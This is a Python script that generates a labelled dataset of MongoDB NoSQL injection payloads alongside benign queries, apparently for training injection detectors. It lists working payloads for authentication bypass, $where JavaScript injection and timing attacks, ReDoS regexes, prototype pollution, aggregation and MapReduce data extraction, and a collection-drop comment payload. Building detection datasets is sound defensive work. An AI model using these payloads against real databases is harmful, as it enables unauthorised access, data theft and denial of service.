#!/usr/bin/env python3
"""
NoSQL Injection Dataset Generator
=================================
Generate NoSQL injection malicious commands and benign commands dataset
Primarily targeting MongoDB syntax

Usage:
    python nosql_dataset_generator.py --total 10000 --malicious-ratio 0.5 --output dataset.csv

Author: Security Research Team
"""

import argparse
import json
import random
import string
from datetime import datetime, timedelta
from typing import List, Dict, Tuple, Any
from enum import Enum

import pandas as pd
from faker import Faker
from tqdm import tqdm

# Initialize Faker
fake = Faker(['en_US', 'zh_CN'])
Faker.seed(42)
random.seed(42)


class InjectionType(Enum):
    """NoSQL Injection Type Enumeration"""
    OPERATOR_INJECTION = "operator_injection"        # Operator injection
    WHERE_INJECTION = "where_injection"              # $where JavaScript injection
    REGEX_INJECTION = "regex_injection"              # Regular expression injection
    JSON_INJECTION = "json_injection"                # JSON structure injection
    ARRAY_INJECTION = "array_injection"              # Array injection
    OR_INJECTION = "or_injection"                    # $or condition injection
    COMMENT_INJECTION = "comment_injection"          # Comment injection
    TYPE_CONFUSION = "type_confusion"                # Type confusion
    AGGREGATION_INJECTION = "aggregation_injection"  # Aggregation pipeline injection
    MAPREDUCE_INJECTION = "mapreduce_injection"      # MapReduce injection


class QueryType(Enum):
    """Normal Query Type Enumeration"""
    SIMPLE_FIND = "simple_find"                      # Simple query
    FIND_WITH_PROJECTION = "find_with_projection"   # Query with projection
    FIND_WITH_SORT = "find_with_sort"               # Query with sorting
    FIND_WITH_LIMIT = "find_with_limit"             # Query with pagination
    COUNT_QUERY = "count_query"                      # Count query
    DISTINCT_QUERY = "distinct_query"                # Distinct query
    AGGREGATION_QUERY = "aggregation_query"          # Aggregation query
    UPDATE_QUERY = "update_query"                    # Update operation
    INSERT_QUERY = "insert_query"                    # Insert operation
    DELETE_QUERY = "delete_query"                    # Delete operation


# ======================= Malicious Query Generator =======================

class MaliciousQueryGenerator:
    """Malicious NoSQL Injection Command Generator"""
    
    def __init__(self):
        self.collections = ['users', 'products', 'orders', 'sessions', 
                           'accounts', 'customers', 'transactions', 'logs']
        self.fields = ['username', 'password', 'email', 'name', 'role', 
                      'status', 'token', 'admin', 'id', 'user_id']
        
    def generate_operator_injection(self) -> Dict[str, Any]:
        """Generate operator injection - most common NoSQL injection type"""
        operators = ['$gt', '$gte', '$lt', '$lte', '$ne', '$nin', '$in', '$exists']
        collection = random.choice(self.collections)
        field = random.choice(self.fields)
        operator = random.choice(operators)
        
        templates = [
            # Authentication bypass
            {"query": {field: {operator: ""}}, "context": f"db.{collection}.find"},
            {"query": {"username": fake.user_name(), "password": {"$ne": ""}}, "context": f"db.{collection}.find"},
            {"query": {"username": {"$gt": ""}, "password": {"$gt": ""}}, "context": f"db.{collection}.find"},
            {"query": {field: {"$exists": True, "$ne": None}}, "context": f"db.{collection}.find"},
            {"query": {"admin": {"$eq": True}}, "context": f"db.{collection}.find"},
            # Data leakage
            {"query": {field: {"$regex": ".*"}}, "context": f"db.{collection}.find"},
            {"query": {"_id": {"$ne": None}}, "context": f"db.{collection}.find"},
            {"query": {field: {"$in": ["admin", "root", "administrator"]}}, "context": f"db.{collection}.find"},
        ]
        
        template = random.choice(templates)
        return {
            "type": InjectionType.OPERATOR_INJECTION.value,
            "collection": collection,
            "query": json.dumps(template["query"]),
            "full_command": f'{template["context"]}({json.dumps(template["query"])})',
            "description": f"Using {operator} operator to bypass authentication or leak data"
        }
    
    def generate_where_injection(self) -> Dict[str, Any]:
        """Generate $where JavaScript injection"""
        collection = random.choice(self.collections)
        
        js_payloads = [
            "this.password.length > 0",
            "this.username == 'admin'",
            "function() { return this.role == 'admin' }",
            "this.a == this.b || 1==1",
            "sleep(5000)",
            "function() { sleep(5000); return true; }",
            "this.constructor.constructor('return process')().exit()",
            "function() { var x = this.password; return x.match(/.*/) }",
            "(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()",
            "this.password.match(/^a/)",
            "db.users.find().forEach(function(u){print(u.password)})",
        ]
        
        payload = random.choice(js_payloads)
        query = {"$where": payload}
        
        return {
            "type": InjectionType.WHERE_INJECTION.value,
            "collection": collection,
            "query": json.dumps(query),
            "full_command": f'db.{collection}.find({json.dumps(query)})',
            "description": "Injecting JavaScript code via $where clause"
        }
    
    def generate_regex_injection(self) -> Dict[str, Any]:
        """Generate regex injection (ReDoS attack)"""
        collection = random.choice(self.collections)
        field = random.choice(self.fields)
        
        regex_payloads = [
            {"$regex": "^a(a+)+$", "$options": "i"},  # ReDoS
            {"$regex": "(a+)+$"},
            {"$regex": "([a-zA-Z]+)*$"},
            {"$regex": "^(a|a)+$"},
            {"$regex": ".*"},  # Match all
            {"$regex": "^.*$", "$options": "s"},
            {"$regex": "admin.*", "$options": "i"},
            {"$regex": "^(?:a+){10,}$"},
            {"$regex": ".{1,1000000}"},
        ]
        
        payload = random.choice(regex_payloads)
        query = {field: payload}
        
        return {
            "type": InjectionType.REGEX_INJECTION.value,
            "collection": collection,
            "query": json.dumps(query),
            "full_command": f'db.{collection}.find({json.dumps(query)})',
            "description": "Using malicious regex for ReDoS attack or data leakage"
        }
    
    def generate_json_injection(self) -> Dict[str, Any]:
        """Generate JSON structure injection"""
        collection = random.choice(self.collections)
        
        # Simulate injection through JSON parsing vulnerability
        payloads = [
            {"username": "admin", "$or": [{"1": "1"}]},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"$comment": "malicious", "username": "admin"},
            {"username.__proto__.admin": True},
            {"constructor": {"prototype": {"admin": True}}},
            {"$and": [{"username": "admin"}, {"$where": "1==1"}]},
        ]
        
        payload = random.choice(payloads)
        
        return {
            "type": InjectionType.JSON_INJECTION.value,
            "collection": collection,
            "query": json.dumps(payload),
            "full_command": f'db.{collection}.find({json.dumps(payload)})',
            "description": "Manipulating query logic through JSON structure"
        }
    
    def generate_array_injection(self) -> Dict[str, Any]:
        """Generate array injection"""
        collection = random.choice(self.collections)
        field = random.choice(self.fields)
        
        payloads = [
            {field: {"$in": [None, "", "admin", {"$gt": ""}]}},
            {field: {"$all": [{"$elemMatch": {"$gt": ""}}]}},
            {field: {"$elemMatch": {"$exists": True}}},
            {f"{field}.0": {"$exists": True}},
            {field: {"$size": {"$gt": 0}}},
        ]
        
        payload = random.choice(payloads)
        
        return {
            "type": InjectionType.ARRAY_INJECTION.value,
            "collection": collection,
            "query": json.dumps(payload),
            "full_command": f'db.{collection}.find({json.dumps(payload)})',
            "description": "Injection through array operators"
        }
    
    def generate_or_injection(self) -> Dict[str, Any]:
        """Generate $or condition injection"""
        collection = random.choice(self.collections)
        
        payloads = [
            {"$or": [{"username": "admin"}, {"1": "1"}]},
            {"$or": [{"a": "a"}, {"b": {"$ne": ""}}]},
            {"$or": [{"password": {"$exists": True}}, {"password": {"$exists": False}}]},
            {"username": "victim", "$or": [{"password": ""}, {"password": {"$ne": ""}}]},
            {"$or": [{"admin": True}, {"admin": {"$exists": False}}]},
            {"$or": [{}, {"_id": {"$exists": True}}]},
        ]
        
        payload = random.choice(payloads)
        
        return {
            "type": InjectionType.OR_INJECTION.value,
            "collection": collection,
            "query": json.dumps(payload),
            "full_command": f'db.{collection}.find({json.dumps(payload)})',
            "description": "Bypassing condition restrictions using $or operator"
        }
    
    def generate_comment_injection(self) -> Dict[str, Any]:
        """Generate comment injection"""
        collection = random.choice(self.collections)
        
        # MongoDB comment injection
        payloads = [
            {"$comment": "'); db.users.drop(); //", "username": "admin"},
            {"username": "admin'--", "password": "anything"},
            {"$comment": "/*", "username": "*/admin"},
        ]
        
        payload = random.choice(payloads)
        
        return {
            "type": InjectionType.COMMENT_INJECTION.value,
            "collection": collection,
            "query": json.dumps(payload),
            "full_command": f'db.{collection}.find({json.dumps(payload)})',
            "description": "Attempting to bypass filters through comment syntax"
        }
    
    def generate_type_confusion(self) -> Dict[str, Any]:
        """Generate type confusion injection"""
        collection = random.choice(self.collections)
        field = random.choice(self.fields)
        
        payloads = [
            {field: {"$type": 2}},  # Find string type
            {field: {"$type": "string"}},
            {field: {"$not": {"$type": 10}}},  # Not null
            {"$and": [{field: {"$exists": True}}, {field: {"$type": "object"}}]},
            {field: []},  # Empty array
            {field: {}},  # Empty object
            {field: None},  # Null value
        ]
        
        payload = random.choice(payloads)
        
        return {
            "type": InjectionType.TYPE_CONFUSION.value,
            "collection": collection,
            "query": json.dumps(payload),
            "full_command": f'db.{collection}.find({json.dumps(payload)})',
            "description": "Exploiting type system for injection attack"
        }
    
    def generate_aggregation_injection(self) -> Dict[str, Any]:
        """Generate aggregation pipeline injection"""
        collection = random.choice(self.collections)
        
        pipelines = [
            [{"$match": {"$where": "1==1"}}, {"$out": "stolen_data"}],
            [{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}],
            [{"$match": {}}, {"$merge": {"into": "attacker_collection"}}],
            [{"$project": {"password": 1, "email": 1}}],
            [{"$group": {"_id": None, "passwords": {"$push": "$password"}}}],
            [{"$redact": {"$cond": {"if": True, "then": "$$DESCEND", "else": "$$PRUNE"}}}],
        ]
        
        pipeline = random.choice(pipelines)
        
        return {
            "type": InjectionType.AGGREGATION_INJECTION.value,
            "collection": collection,
            "query": json.dumps(pipeline),
            "full_command": f'db.{collection}.aggregate({json.dumps(pipeline)})',
            "description": "Injecting malicious operations through aggregation pipeline"
        }
    
    def generate_mapreduce_injection(self) -> Dict[str, Any]:
        """Generate MapReduce injection"""
        collection = random.choice(self.collections)
        
        map_functions = [
            "function() { emit(this._id, this.password); }",
            "function() { var x = db.users.find().toArray(); emit(1, x); }",
            "function() { sleep(10000); emit(this._id, 1); }",
        ]
        
        reduce_functions = [
            "function(key, values) { return values.join(','); }",
            "function(key, values) { db.stolen.insert({data: values}); return 1; }",
        ]
        
        mapreduce_cmd = {
            "mapreduce": collection,
            "map": random.choice(map_functions),
            "reduce": random.choice(reduce_functions),
            "out": "attack_results"
        }
        
        return {
            "type": InjectionType.MAPREDUCE_INJECTION.value,
            "collection": collection,
            "query": json.dumps(mapreduce_cmd),
            "full_command": f'db.runCommand({json.dumps(mapreduce_cmd)})',
            "description": "Executing malicious JavaScript through MapReduce"
        }
    
    def generate(self) -> Dict[str, Any]:
        """Randomly generate a malicious command"""
        generators = [
            self.generate_operator_injection,
            self.generate_where_injection,
            self.generate_regex_injection,
            self.generate_json_injection,
            self.generate_array_injection,
            self.generate_or_injection,
            self.generate_comment_injection,
            self.generate_type_confusion,
            self.generate_aggregation_injection,
            self.generate_mapreduce_injection,
        ]
        
        # Weights: operator injection and $or injection are more common
        weights = [25, 15, 10, 10, 8, 15, 5, 5, 5, 2]
        
        generator = random.choices(generators, weights=weights, k=1)[0]
        result = generator()
        result["label"] = "malicious"
        result["timestamp"] = datetime.now().isoformat()
        
        return result


# ======================= Benign Query Generator =======================

class BenignQueryGenerator:
    """Normal NoSQL Query Generator"""
    
    def __init__(self):
        self.collections = ['users', 'products', 'orders', 'sessions', 
                           'customers', 'articles', 'comments', 'logs']
    
    def _generate_user_data(self) -> Dict[str, Any]:
        """Generate user data"""
        return {
            "username": fake.user_name(),
            "email": fake.email(),
            "name": fake.name(),
            "age": random.randint(18, 80),
            "country": fake.country(),
            "created_at": fake.date_time_this_year().isoformat(),
            "status": random.choice(["active", "inactive", "pending"]),
            "role": random.choice(["user", "moderator", "editor"])
        }
    
    def _generate_product_data(self) -> Dict[str, Any]:
        """Generate product data"""
        return {
            "name": fake.catch_phrase(),
            "price": round(random.uniform(9.99, 999.99), 2),
            "category": random.choice(["electronics", "clothing", "books", "food", "toys"]),
            "stock": random.randint(0, 1000),
            "rating": round(random.uniform(1, 5), 1),
            "brand": fake.company()
        }
    
    def _generate_order_data(self) -> Dict[str, Any]:
        """Generate order data"""
        return {
            "order_id": fake.uuid4(),
            "user_id": fake.uuid4(),
            "total": round(random.uniform(10, 5000), 2),
            "status": random.choice(["pending", "processing", "shipped", "delivered", "cancelled"]),
            "created_at": fake.date_time_this_month().isoformat(),
            "items_count": random.randint(1, 20)
        }
    
    def generate_simple_find(self) -> Dict[str, Any]:
        """Generate simple query"""
        collection = random.choice(self.collections)
        
        queries = [
            {"username": fake.user_name()},
            {"email": fake.email()},
            {"status": random.choice(["active", "inactive", "pending"])},
            {"_id": fake.uuid4()},
            {"name": fake.name()},
            {"category": random.choice(["electronics", "clothing", "books"])},
            {"price": round(random.uniform(10, 100), 2)},
            {"order_id": fake.uuid4()},
            {"role": "user"},
            {"country": fake.country()},
        ]
        
        query = random.choice(queries)
        
        return {
            "type": QueryType.SIMPLE_FIND.value,
            "collection": collection,
            "query": json.dumps(query),
            "full_command": f'db.{collection}.find({json.dumps(query)})',
            "description": "Simple field match query"
        }
    
    def generate_find_with_projection(self) -> Dict[str, Any]:
        """Generate query with projection"""
        collection = random.choice(self.collections)
        
        query = {"status": "active"}
        projections = [
            {"name": 1, "email": 1, "_id": 0},
            {"password": 0},  # Exclude sensitive field
            {"username": 1, "created_at": 1},
            {"price": 1, "name": 1, "stock": 1},
        ]
        
        projection = random.choice(projections)
        
        return {
            "type": QueryType.FIND_WITH_PROJECTION.value,
            "collection": collection,
            "query": json.dumps(query),
            "full_command": f'db.{collection}.find({json.dumps(query)}, {json.dumps(projection)})',
            "description": "Query with field projection"
        }
    
    def generate_find_with_sort(self) -> Dict[str, Any]:
        """Generate query with sorting"""
        collection = random.choice(self.collections)
        
        query = {}
        sort_options = [
            {"created_at": -1},
            {"name": 1},
            {"price": -1},
            {"rating": -1, "price": 1},
            {"updated_at": -1},
        ]
        
        sort_opt = random.choice(sort_options)
        
        return {
            "type": QueryType.FIND_WITH_SORT.value,
            "collection": collection,
            "query": json.dumps(query),
            "full_command": f'db.{collection}.find({json.dumps(query)}).sort({json.dumps(sort_opt)})',
            "description": "Query with sorting"
        }
    
    def generate_find_with_limit(self) -> Dict[str, Any]:
        """Generate query with pagination"""
        collection = random.choice(self.collections)
        
        query = {"status": "active"}
        limit = random.randint(10, 100)
        skip = random.randint(0, 500)
        
        return {
            "type": QueryType.FIND_WITH_LIMIT.value,
            "collection": collection,
            "query": json.dumps(query),
            "full_command": f'db.{collection}.find({json.dumps(query)}).skip({skip}).limit({limit})',
            "description": "Query with pagination"
        }
    
    def generate_count_query(self) -> Dict[str, Any]:
        """Generate count query"""
        collection = random.choice(self.collections)
        
        queries = [
            {"status": "active"},
            {"created_at": {"$gte": fake.date_this_month().isoformat()}},
            {"category": random.choice(["electronics", "books"])},
            {},
        ]
        
        query = random.choice(queries)
        
        return {
            "type": QueryType.COUNT_QUERY.value,
            "collection": collection,
            "query": json.dumps(query),
            "full_command": f'db.{collection}.countDocuments({json.dumps(query)})',
            "description": "Document count query"
        }
    
    def generate_distinct_query(self) -> Dict[str, Any]:
        """Generate distinct query"""
        collection = random.choice(self.collections)
        fields = ["category", "status", "country", "role", "brand"]
        field = random.choice(fields)
        
        return {
            "type": QueryType.DISTINCT_QUERY.value,
            "collection": collection,
            "query": json.dumps({"field": field}),
            "full_command": f'db.{collection}.distinct("{field}")',
            "description": "Field distinct query"
        }
    
    def generate_aggregation_query(self) -> Dict[str, Any]:
        """Generate normal aggregation query"""
        collection = random.choice(self.collections)
        
        pipelines = [
            [{"$match": {"status": "active"}}, {"$count": "total"}],
            [{"$group": {"_id": "$category", "count": {"$sum": 1}}}],
            [{"$match": {"price": {"$gte": 100}}}, {"$sort": {"price": -1}}, {"$limit": 10}],
            [{"$group": {"_id": "$status", "avgPrice": {"$avg": "$price"}}}],
            [{"$match": {"created_at": {"$gte": fake.date_this_month().isoformat()}}}, 
             {"$group": {"_id": None, "total": {"$sum": "$total"}}}],
        ]
        
        pipeline = random.choice(pipelines)
        
        return {
            "type": QueryType.AGGREGATION_QUERY.value,
            "collection": collection,
            "query": json.dumps(pipeline),
            "full_command": f'db.{collection}.aggregate({json.dumps(pipeline)})',
            "description": "Aggregation pipeline query"
        }
    
    def generate_update_query(self) -> Dict[str, Any]:
        """Generate update operation"""
        collection = random.choice(self.collections)
        
        filter_query = {"_id": fake.uuid4()}
        update_operations = [
            {"$set": {"status": "active"}},
            {"$set": {"updated_at": datetime.now().isoformat()}},
            {"$inc": {"view_count": 1}},
            {"$set": {"name": fake.name()}},
            {"$push": {"tags": fake.word()}},
        ]
        
        update = random.choice(update_operations)
        
        return {
            "type": QueryType.UPDATE_QUERY.value,
            "collection": collection,
            "query": json.dumps({"filter": filter_query, "update": update}),
            "full_command": f'db.{collection}.updateOne({json.dumps(filter_query)}, {json.dumps(update)})',
            "description": "Document update operation"
        }
    
    def generate_insert_query(self) -> Dict[str, Any]:
        """Generate insert operation"""
        collection = random.choice(['users', 'products', 'orders'])
        
        if collection == 'users':
            doc = self._generate_user_data()
        elif collection == 'products':
            doc = self._generate_product_data()
        else:
            doc = self._generate_order_data()
        
        return {
            "type": QueryType.INSERT_QUERY.value,
            "collection": collection,
            "query": json.dumps(doc),
            "full_command": f'db.{collection}.insertOne({json.dumps(doc)})',
            "description": "Document insert operation"
        }
    
    def generate_delete_query(self) -> Dict[str, Any]:
        """Generate delete operation"""
        collection = random.choice(self.collections)
        
        filters = [
            {"_id": fake.uuid4()},
            {"status": "deleted"},
            {"created_at": {"$lt": fake.date_this_year().isoformat()}},
        ]
        
        filter_query = random.choice(filters)
        
        return {
            "type": QueryType.DELETE_QUERY.value,
            "collection": collection,
            "query": json.dumps(filter_query),
            "full_command": f'db.{collection}.deleteOne({json.dumps(filter_query)})',
            "description": "Document delete operation"
        }
    
    def generate(self) -> Dict[str, Any]:
        """Randomly generate a benign command"""
        generators = [
            self.generate_simple_find,
            self.generate_find_with_projection,
            self.generate_find_with_sort,
            self.generate_find_with_limit,
            self.generate_count_query,
            self.generate_distinct_query,
            self.generate_aggregation_query,
            self.generate_update_query,
            self.generate_insert_query,
            self.generate_delete_query,
        ]
        
        # Weights: simple queries are more common
        weights = [25, 15, 15, 15, 8, 5, 7, 5, 3, 2]
        
        generator = random.choices(generators, weights=weights, k=1)[0]
        result = generator()
        result["label"] = "benign"
        result["timestamp"] = datetime.now().isoformat()
        
        return result


# ======================= Dataset Generator =======================

class NoSQLDatasetGenerator:
    """NoSQL Injection Dataset Generator"""
    
    def __init__(self, malicious_ratio: float = 0.5):
        """
        Initialize generator
        
        Args:
            malicious_ratio: Ratio of malicious commands (0.0 - 1.0)
        """
        self.malicious_ratio = malicious_ratio
        self.malicious_gen = MaliciousQueryGenerator()
        self.benign_gen = BenignQueryGenerator()
    
    def generate_dataset(self, total: int, show_progress: bool = True) -> List[Dict[str, Any]]:
        """
        Generate dataset
        
        Args:
            total: Total number of data entries
            show_progress: Whether to show progress bar
            
        Returns:
            List of data entries
        """
        malicious_count = int(total * self.malicious_ratio)
        benign_count = total - malicious_count
        
        print(f"\n📊 Dataset Configuration:")
        print(f"   Total: {total}")
        print(f"   Malicious commands: {malicious_count} ({self.malicious_ratio*100:.1f}%)")
        print(f"   Benign commands: {benign_count} ({(1-self.malicious_ratio)*100:.1f}%)")
        print()
        
        dataset = []
        
        # Generate malicious commands
        iterator = tqdm(range(malicious_count), desc="Generating malicious") if show_progress else range(malicious_count)
        for _ in iterator:
            dataset.append(self.malicious_gen.generate())
        
        # Generate benign commands
        iterator = tqdm(range(benign_count), desc="Generating benign") if show_progress else range(benign_count)
        for _ in iterator:
            dataset.append(self.benign_gen.generate())
        
        # Shuffle order
        random.shuffle(dataset)
        
        # Add index
        for i, item in enumerate(dataset):
            item["id"] = i + 1
        
        return dataset
    
    def save_to_csv(self, dataset: List[Dict[str, Any]], output_path: str):
        """Save as CSV format"""
        df = pd.DataFrame(dataset)
        # Adjust column order
        columns = ['id', 'label', 'type', 'collection', 'query', 'full_command', 'description', 'timestamp']
        df = df[columns]
        df.to_csv(output_path, index=False, encoding='utf-8')
        print(f"✅ CSV file saved: {output_path}")
    
    def save_to_json(self, dataset: List[Dict[str, Any]], output_path: str):
        """Save as JSON format"""
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(dataset, f, ensure_ascii=False, indent=2)
        print(f"✅ JSON file saved: {output_path}")
    
    def save_to_jsonl(self, dataset: List[Dict[str, Any]], output_path: str):
        """Save as JSONL format (suitable for ML)"""
        with open(output_path, 'w', encoding='utf-8') as f:
            for item in dataset:
                f.write(json.dumps(item, ensure_ascii=False) + '\n')
        print(f"✅ JSONL file saved: {output_path}")
    
    def print_statistics(self, dataset: List[Dict[str, Any]]):
        """Print dataset statistics"""
        df = pd.DataFrame(dataset)
        
        print("\n" + "="*60)
        print("📈 Dataset Statistics")
        print("="*60)
        
        # Label distribution
        print("\n🏷️  Label Distribution:")
        label_counts = df['label'].value_counts()
        for label, count in label_counts.items():
            percentage = count / len(df) * 100
            print(f"   {label}: {count} ({percentage:.1f}%)")
        
        # Type distribution
        print("\n📂 Command Type Distribution:")
        type_counts = df['type'].value_counts()
        for type_name, count in type_counts.items():
            percentage = count / len(df) * 100
            print(f"   {type_name}: {count} ({percentage:.1f}%)")
        
        # Collection distribution
        print("\n🗂️  Collection Distribution:")
        collection_counts = df['collection'].value_counts()
        for coll, count in collection_counts.head(5).items():
            percentage = count / len(df) * 100
            print(f"   {coll}: {count} ({percentage:.1f}%)")
        
        print("\n" + "="*60)


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='NoSQL Injection Dataset Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate 10000 entries, 50% malicious and 50% benign
  python nosql_dataset_generator.py --total 10000 --malicious-ratio 0.5

  # Generate 50000 entries with 30% malicious
  python nosql_dataset_generator.py --total 50000 --malicious-ratio 0.3 --output large_dataset.csv

  # Output in multiple formats
  python nosql_dataset_generator.py --total 10000 --format all
        """
    )
    
    parser.add_argument(
        '--total', '-n',
        type=int,
        default=10000,
        help='Total number of entries to generate (default: 10000)'
    )
    
    parser.add_argument(
        '--malicious-ratio', '-m',
        type=float,
        default=0.5,
        help='Ratio of malicious commands (0.0-1.0, default: 0.5)'
    )
    
    parser.add_argument(
        '--output', '-o',
        type=str,
        default='nosql_injection_dataset',
        help='Output filename (without extension)'
    )
    
    parser.add_argument(
        '--format', '-f',
        type=str,
        choices=['csv', 'json', 'jsonl', 'all'],
        default='csv',
        help='Output format (default: csv)'
    )
    
    parser.add_argument(
        '--seed', '-s',
        type=int,
        default=42,
        help='Random seed (default: 42)'
    )
    
    parser.add_argument(
        '--no-progress',
        action='store_true',
        help='Disable progress bar'
    )
    
    args = parser.parse_args()
    
    # Set random seed
    random.seed(args.seed)
    Faker.seed(args.seed)
    
    # Validate arguments
    if not 0 <= args.malicious_ratio <= 1:
        parser.error("Malicious ratio must be between 0 and 1")
    
    if args.total < 1:
        parser.error("Total must be greater than 0")
    
    print("🚀 NoSQL Injection Dataset Generator")
    print("="*60)
    
    # Create generator
    generator = NoSQLDatasetGenerator(malicious_ratio=args.malicious_ratio)
    
    # Generate dataset
    dataset = generator.generate_dataset(
        total=args.total,
        show_progress=not args.no_progress
    )
    
    # Save dataset
    print("\n💾 Saving dataset...")
    
    if args.format in ['csv', 'all']:
        generator.save_to_csv(dataset, f"{args.output}.csv")
    
    if args.format in ['json', 'all']:
        generator.save_to_json(dataset, f"{args.output}.json")
    
    if args.format in ['jsonl', 'all']:
        generator.save_to_jsonl(dataset, f"{args.output}.jsonl")
    
    # Print statistics
    generator.print_statistics(dataset)
    
    print("\n🎉 Dataset generation complete!")


if __name__ == "__main__":
    main()
